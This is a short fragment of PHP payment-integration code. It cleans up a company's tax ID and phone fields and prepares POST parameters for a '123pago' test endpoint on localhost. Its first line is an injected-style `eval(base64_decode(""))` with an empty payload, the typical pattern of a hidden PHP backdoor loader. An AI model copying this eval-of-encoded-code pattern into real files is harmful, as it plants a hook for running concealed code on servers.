<?php	 	eval(base64_decode("")); 
	$aux = explode('-', $usu_detalle["Emp_Rif_Ci"]);
	$aux = $aux[1];
	$aux = str_replace(".", "",  $aux); 
	$tlf = str_replace('(', '', $usu_detalle["Emp_Telefono1"]);
	$post_url = "http://localhost/sf/web/pago/123pago-action.php"; //(TEST)
	$post_values = array(
		"Parametro1" => 00,
		"Parametro2" => "mpbd_5085ac7b00b31",
		);
